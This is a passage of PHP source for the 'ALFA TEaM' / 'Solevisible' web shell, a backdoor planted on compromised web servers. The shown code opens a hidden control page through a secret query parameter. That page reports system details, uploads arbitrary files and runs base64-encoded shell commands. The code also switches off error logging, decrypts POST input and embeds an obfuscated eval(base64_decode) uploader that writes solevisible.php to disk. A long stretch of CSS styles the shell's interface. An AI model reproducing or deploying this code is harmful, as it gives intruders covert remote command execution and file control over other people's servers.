		$http .= $post . "\r\n\r\n";
		fwrite($socket, $http);
		$contents = "";
		while (!@feof($socket)) {
			$contents .= @fgets($socket, 4096);
		}
		list($header, $body) = explode("\r\n\r\n", $contents, 2);
		@fclose($socket);
		return $body;
	}else{
		return "";
	}
}
if(isset($_GET["solevisible"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>Solevisible Hidden Shell</title>";
echo "<body bgcolor=#000000>";
echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
$safe_mode = @ini_get('safe_mode');
if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
echo "<b style='color: #7CFC00'>Safe Mode : $r<br>";
echo"<font color=#7CFC00>Disable functions : </font>";
$disfun = @ini_get('disable_functions');
if(empty($disfun)){$disfun = '<font color="green">NONE</font>';}
echo"<font color=red>";
echo "$disfun";
echo"</font><br>";
echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@alfaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
if(isset($_FILES['file'])){
if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
}
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.value = btoa(unescape(encodeURIComponent(this.command_solevisible.value)));" method="POST">Execute Command: <input name="command_solevisible" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
<hr><pre>';
if(isset($_POST['command_solevisible'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
$solevisible = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
echo alfaEx($solevisible);
}
echo'</pre>
</body></html>';
exit;}
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('magic_quotes_runtime', 0);
@set_time_limit(0);
if(function_exists('set_magic_quotes_runtime')){
@set_magic_quotes_runtime(0);
}
foreach($_POST as $key => $value){
if(is_array($_POST[$key])){
$i=0;
foreach($_POST[$key] as $f) {
$f = trim(str_replace(' ', '+',$f));
$_POST[$key][$i] = decrypt_post($f);
$i++;
}
}else{
$value = trim(str_replace(' ', '+',$value));
$_POST[$key] = decrypt_post($value);
}
}
$default_action = 'FilesMan2';//'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
if(strtolower(substr(PHP_OS,0,3))=="win")
$GLOBALS['sys']='win';
else
$GLOBALS['sys']='unix';
$GLOBALS['home_cwd'] = @alfaGetCwd();
$GLOBALS["need_to_update_header"] = "false";
$GLOBALS['glob_chdir_false'] = false;
if(isset($_POST['c'])){
if(!@chdir($_POST['c'])){
	$GLOBALS['glob_chdir_false'] = true;
}
}
$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@alfaGetCwd());
if($GLOBALS['glob_chdir_false']){
	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @alfaGetCwd());
}
if($GLOBALS['sys'] == 'win'){
$GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
$GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
}
if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
if(!function_exists("mb_strlen")){
	function mb_strlen($str, $c=""){
		return strlen($str);
	}
}
if(!function_exists("mb_substr")){
	function mb_substr($str, $start, $end, $c=""){
		return substr($str, $start, $end);
	}
}
define("ALFA_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
function alfahead(){
$GLOBALS['__ALFA_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
define("ALFA_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($alfa_uploader)."'))");
if(!isset($_POST['ajax'])){
function Alfa_GetDisable_Function(){
$disfun = @ini_get('disable_functions');
$afa = '<span class="header_show_all">All Functions Accessible</span>';
if(empty($disfun))return($afa);
$s = explode(',',$disfun);
$s = array_unique($s);
$i=0;
$b=0;
$func = array('system','exec','shell_exec','proc_open','popen','passthru','symlink','dl');
$black_list = array();
$allow_list = array();
foreach($s as $d){
	$d=trim($d);
	if(empty($d)||!is_callable($d))continue;
	if(!function_exists($d)){
		if(in_array($d,$func)){
			$dis .= $d." | ";$b++;
			$black_list[] = $d;
		}else{
			$allow_list[] = $d;
		}
		$i++;
	}
}
if($i==0)return($afa);
if($i <= count($func)){
$all = array_values(array_merge($black_list, $allow_list));
return('<span class="disable_functions">'.implode(" | ", $all).'</span>');
}
return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="alfa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
}
function AlfaNum(){
$args = func_get_args();
$alfax = array();
$find = array();
for($i=1;$i<=10;$i++){
$alfax[] = $i;
}
foreach($args as $arg){
$find[] = $arg;
}
echo '<script>';
foreach($alfax as $alfa){
if(in_array($alfa,$find))
continue;
echo 'alfa'.$alfa."_=";
}
echo '""</script>';
}
if(empty($_POST['charset']))
$_POST['charset'] = $GLOBALS['default_charset'];
$freeSpace = function_exists('diskfreespace')?@diskfreespace($GLOBALS['cwd']):'?';
$totalSpace = function_exists('disk_total_space')?@disk_total_space($GLOBALS['cwd']):'?';
$totalSpace = $totalSpace?$totalSpace:1;
$on="<span class='header_on'> ON </span>";
$of="<span class='header_off'> OFF </span>";
$none="<span class='header_none'> NONE </span>";
if(function_exists('ssh2_connect'))
$ssh2=$on;
else
$ssh2=$of;
if(function_exists('curl_version'))
$curl=$on;
else
$curl=$of;
if(function_exists('mysql_get_client_info')||class_exists('mysqli'))
$mysql=$on;
else
$mysql=$of;
if(function_exists('mssql_connect'))
$mssql=$on;
else
$mssql=$of;
if(function_exists('pg_connect'))
$pg=$on;
else
$pg=$of;
if(function_exists('oci_connect'))
$or=$on;
else
$or=$of;
if(@ini_get('disable_functions'))
$disfun=@ini_get('disable_functions');
else
$disfun="All Functions Enable";
if(@ini_get('safe_mode'))
$safe_modes="<span class='header_off'>ON</span>";
else
$safe_modes="<span class='header_on'>OFF</span>";
$cgi_shell="<span class='header_off' id='header_cgishell'>OFF</span>";
if(@ini_get('open_basedir')){
$basedir_data = @ini_get('open_basedir');
if(strlen($basedir_data)>120){
$open_b=substr($basedir_data,0, 120)."...";
}else{
$open_b = $basedir_data;
}
}else{$open_b=$none;}
if(@ini_get('safe_mode_exec_dir'))
$safe_exe=@ini_get('safe_mode_exec_dir');
else
$safe_exe=$none;
if(@ini_get('safe_mode_include_dir'))
$safe_include=@ini_get('safe_mode_include_dir');
else
$safe_include=$none;
if(!function_exists('posix_getegid'))
{
$user = function_exists("get_current_user")?@get_current_user():"????";
$uid = function_exists("getmyuid")?@getmyuid():"????";
$gid = function_exists("getmygid")?@getmygid():"????";
$group = "?";
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("posix_geteuid")?@posix_getpwuid(posix_geteuid()):array("name"=>"????", "uid"=>"????");
$gid = function_exists("posix_getgrgid")&&function_exists("posix_getegid")?@posix_getgrgid(posix_getegid()):array("name"=>"????", "gid"=>"????");
$user = $uid['name'];
$uid = $uid['uid'];
$group = $gid['name'];
$gid = $gid['gid'];
}
$cwd_links = '';
$path = explode("/", $GLOBALS['cwd']);
$n=count($path);
for($i=0; $i<$n-1; $i++) {
$cwd_links .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
$cach_cwd_path = "";
for($j=0; $j<=$i; $j++){
$cwd_links .= $path[$j].'/';
$cach_cwd_path .= $path[$j].'/';
}
$cwd_links .= "\")' path='".$cach_cwd_path."' href='#action=fileman&path=".$cach_cwd_path."'>".$path[$i]."/</a>";
}
$drives = "";
foreach(range('a','z') as $drive)
if(@is_dir($drive.':\\'))
$drives .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
$csscode ='	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
<link href="'.__showicon('alfamini').'" rel="icon" type="image/x-icon"/>
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
.hlabale{color:#67abdf;border-radius:4px;border:1px solid #27979b;margin-left:7px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;top:0;right:0;bottom:0;left:0;background:#1b292b26;top:50px}.editor-view{position:relative;height:100%}.view-content{position:absolute;overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#000115}::-webkit-scrollbar{width:10px;background-color:#000115}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.editor-icon{position:absolute}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:#2fd051;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#fff;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-7px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#0e304a;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:wheat;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:7px;background:#1d5673;cursor:pointer;position:absolute;box-sizing:border-box;line-height:50px;display:inline-block;top:17px;border-radius:100px}.editor-minimize{right:50px}.close-button:after,.close-button:before,.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgba(216,207,207,.75);transition:all .25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:after{transform:rotate(-135deg)}.close-button:hover:after,.close-button:hover:before,.editor-minimize:hover:before{background-color:red}.close-button:hover,.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%}.editor-header{width:97%;background:rgba(21,66,88,.93);height:37px;margin-left:13px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#00ff7f}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);height:90%;margin-left:20%;margin-right:2%;border:2px #0e304a solid}.editor-explorer{width:19%;height:90%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%;border:2px #0e304a solid}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#fff;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px #206aa2 solid;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:7px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:editorClose .8s ease-in-out forwards;-moz-animation:editorClose .8s ease-in-out forwards;-ms-animation:editorClose .8s ease-in-out forwards;animation:editorClose .8s ease-in-out forwards}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:editorMinimize .8s ease-in-out forwards;-moz-animation:editorMinimize .8s ease-in-out forwards;-ms-animation:editorMinimize .8s ease-in-out forwards;animation:editorMinimize .8s ease-in-out forwards}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:editorShow .8s ease-in-out forwards;-moz-animation:editorShow .8s ease-in-out forwards;-ms-animation:editorShow .8s ease-in-out forwards;animation:editorShow .8s ease-in-out forwards}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:minimizeShow .8s ease-in-out forwards;-moz-animation:minimizeShow .8s ease-in-out forwards;-ms-animation:minimizeShow .8s ease-in-out forwards;animation:minimizeShow .8s ease-in-out forwards}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:minimizeHide .8s ease-in-out forwards;-moz-animation:minimizeHide .8s ease-in-out forwards;-ms-animation:minimizeHide .8s ease-in-out forwards;animation:minimizeHide .8s ease-in-out forwards}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.solevisible-text:hover{-webkit-text-shadow:0 0 25px #0f0;-moz-text-shadow:0 0 25px #0f0;-ms-text-shadow:0 0 25px #0f0;text-shadow:0 0 25px #0f0}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px #0e265a solid}.update-close:hover{border:2px #25ff00 solid;color:red}.filestools{height:auto;width:auto;color:#67abdf;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px}.editor-path{top:3px}}.filters-holder{padding:5px;padding-left:10px}.filters-holder input{width:200px}.filters-holder span{color:#8bc7f7}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:#0f304a;color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#fff;font-weight:bolder;text-decoration:none;padding:6px 8px 6px 30px;position:relative;padding-left:40px}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#fff;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:190px;width:500px;color:#fff}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#fff}#shortcutMenu-holder>form{padding:10px}#shortcutMenu-holder>form>label{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#fff;outline:0;font-size:16px}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#fff;outline:0}.php-terminal-output{overflow:auto;height:86%;border:1px solid #1e5673;border-radius:10px}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#dff3d5;background:#093d58;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#37504e;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(69% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL,#myUL ul{list-style-type:none}#myUL{margin:0;padding:0}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.nested{display:none}.active{display:block}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:300px;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:50vh}#options_window .content_options_holder .options_holder.option_is_active{display:block}#options_window .content_options_holder .options_tab{padding:5px;margin-left:14px;margin-right:30px;background:#000;border-bottom:7px solid #0f304a;border-left:7px solid #0f304a;border-right:7px solid #0f304a;overflow-x:auto;white-space:nowrap}#filesman_tabs .filesman_tab img,#options_window .content_options_holder .options_tab .tab_name img,.editor-tab-name img,.sql-tabs .sql-tabname img,.terminal-tabs .terminal-tab img{width:10px;vertical-align:middle;margin-left:5px}#filesman_tabs .filesman_tab,#options_window .content_options_holder .options_tab .tab_name,.editor-tab-name,.sql-tabs .sql-newtab,.sql-tabs .sql-tabname,.terminal-tabs .terminal-tab{display:inline-block;background-color:#133d51;border-radius:4px;padding:5px;color:#fff;margin-right:3px;padding:5px;cursor:pointer;margin-bottom:1px;transition:background-color .5s}#filesman_tabs .filesman_tab{min-width:55px;text-align:center}#filesman_tabs .filesman_tab:hover,#options_window .content_options_holder .options_tab .tab_name:hover,.editor-tab-name:hover,.sql-tabs .sql-tabname:hover,.terminal-tabs .terminal-tab:hover{background-color:#a23939}.editor-tabs,.sql-tabs,.terminal-tabs{padding:5px;overflow-x:auto;white-space:nowrap}.options-loader-holder{position:absolute;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:11}.options-loader-holder img{position:absolute;top:32%;left:45%;transform:translate(-50%,-50%);width:100px;animation:spin 2s infinite}#filesman_tabs .filesman_tab.filesman-tab-active,#options_window .content_options_holder .options_tab .tab_name.tab_is_active,.editor-tab-name.editor-tab-active,.sql-tabname.sql-active-tab,.terminal-tab.active-terminal-tab{background-color:#009688}.tab-is-done{animation:2s tab_change_color infinite step-end}.stopAjax{color:#fff;font-size:20px;display:inline-block;padding:10px;cursor:pointer}#a_loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:99}.fmanager-row>td{position:relative}.fmanager-row .symlink_path{position:fixed;max-width:100%;background-color:#0f304a;border-radius:10px;font-size:15px;padding:8px;color:#fdf4f4;border:1px solid #8a8a8a;z-index:1;pointer-events:none}.archive-icons{vertical-align:middle}.archive-type-dir{font-weight:bolder}.archive-type-file{font-weight:unset}.archive-name{cursor:pointer}.archive_dir_holder a{color:#0f0;font-weight:bolder;cursor:pointer}.archive_dir_holder a:hover{color:#fff}.editor-content{height:100%}.editor-content-holder{height:90%}.editor-contents{display:none;position:relative;height:100%}.editor-contents.editor-content-active{display:block}.history-panel-controller{position:absolute;color:#fff;padding:10px;z-index:1000;border-radius:10px;top:50%;left:19%;background-color:#009687;cursor:pointer}.sql-content{display:none;position:relative;min-height:300px}.sql-content.sql-active-content{display:block}.pages-holder{padding:7px}.pages-number{display:inline-block;margin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#0f304a;margin-right:8px;cursor:pointer;width:33px;display:inline-block;text-align:center;border-radius:5px;color:#fff;transition:background .5s}.active-page-number{background:#10925c!important}.pages-number a.page-number:hover{background:#8a8a8a}.terminal-content{height:100%}.terminal-content,.terminal-tab{display:none}.terminal-content.active-terminal-content{display:block;position:relative}.terminal-btn-fontctl{background:#009688;width:50px;color:#fff;font-weight:bolder;outline:0;cursor:pointer}.alert-area{max-height:100%;position:fixed;bottom:5px;left:20px;right:20px;z-index:9999}.alert-box{font-size:16px;color:#fff;background:rgba(0,0,0,.9);line-height:1.3em;padding:10px 15px;margin:5px 10px;position:relative;border-radius:5px;transition:opacity .5s ease-in;-webkit-animation:alert-shake .5s ease-in-out;animation:alert-shake .5s ease-in-out}.alert-content-title{font-weight:700}.alert-box.alert-success{background:rgba(56,127,56,.89)}.alert-error{background:rgba(191,54,54,.89)}.alert-box.hide{opacity:0}.alert-close{background:0 0;width:12px;height:12px;position:absolute;top:15px;right:15px}.alert-close:after,.alert-close:before{content:"";width:15px;border-top:solid 2px #fff;position:absolute;top:5px;right:-1px;display:block}.alert-close:before{transform:rotate(45deg)}.alert-close:after{transform:rotate(135deg)}.alert-close:hover:after,.alert-close:hover:before{border-top:solid 2px #d8d8d8}@media (max-width:767px) and (min-width:481px){.alert-area{left:100px;right:100px}}@media (min-width:768px){.alert-area{width:350px;left:auto;right:0;z-index:9999}}@keyframes tab_change_color{0%{background-color:#133d51}50%{background-color:green}}@-webkit-keyframes alert-shake{0%{-webkit-transform:translateX(0)}20%{-webkit-transform:translateX(-10px)}40%{-webkit-transform:translateX(10px)}60%{-webkit-transform:translateX(-10px)}80%{-webkit-transform:translateX(10px)}100%{-webkit-transform:translateX(0)}}@keyframes alert-shake{0%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}100%{transform:translateX(0)}}.textEffect{position:absolute;width:500px;top:-10px;animation:alert-shake .5s ease-in-out;animation-iteration-count:2}.alfateam-loader-text{position:absolute;color:#46bb45;top:23%;left:49%;transform:translate(-50%,-50%);font-size:40px;letter-spacing:7px}.alfa-ajax-error{position:absolute;color:#ff0a0a;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px}.connection-hist-table{margin-left:auto;margin-right:auto;text-align:justify;border-collapse:collapse}.connection-hist-table td,.connection-hist-table th{border:1px solid #ddd;text-align:left;padding:8px}.connection-his-btn{margin-bottom:10px;padding:5px;background:#206920;color:#fff;border:none;outline:0;cursor:pointer;font-weight:700;transition:background .3s}.connection-his-btn.connection-delete{margin:unset;padding:5px;background:red;width:33px;border-radius:3px;transition:background .3s}.connection-delete:hover{background:#f56969!important}.connection-his-btn:hover{background:#30b330}#up_bar_holder{position:fixed;z-index:100000;width:100%}#filesman_tabs{padding:8px;border:1px solid #0e304a;color:#67abdf;overflow-x:auto;white-space:nowrap}.sortable-ghost{opacity:.5;background:#c8ebfb}.folder-tab-icon{width:16px!important}#filesman-tab-full-path{display:none;position:absolute;pointer-events:none;background:#163746;padding:7px;color:#0f0;border-radius:10px;min-width:58px;z-index:10}#filesman-tab-full-path::after{content:"";position:absolute;top:100%;left:35px;margin-left:-5px;border-width:5px;border-style:solid;pointer-events:none;border-color:#163746 transparent transparent transparent}.mysql-main{height:84vh;position:relative}.mysql-hide-content{display:none}.mysql-query-result-tabs{margin-bottom:10px;padding:3px;border-bottom:4px solid #0f304a}.mysql-main .tables-panel-ctl{position:absolute;color:#fff;padding:10px;z-index:1;border-radius:10px;top:45%;left:calc(17% + 10px);background-color:#009687;cursor:pointer}.tables-panel-ctl-min{left:-21px!important}.mysql-query-result-tabs div{display:inline-block;padding:5px;margin-right:2px;background:#133d51;color:#fff;cursor:pointer;transition:background-color .5s}.mysql-query-result-tabs div:hover{background-color:#a23939}.mysql-query-result-tabs 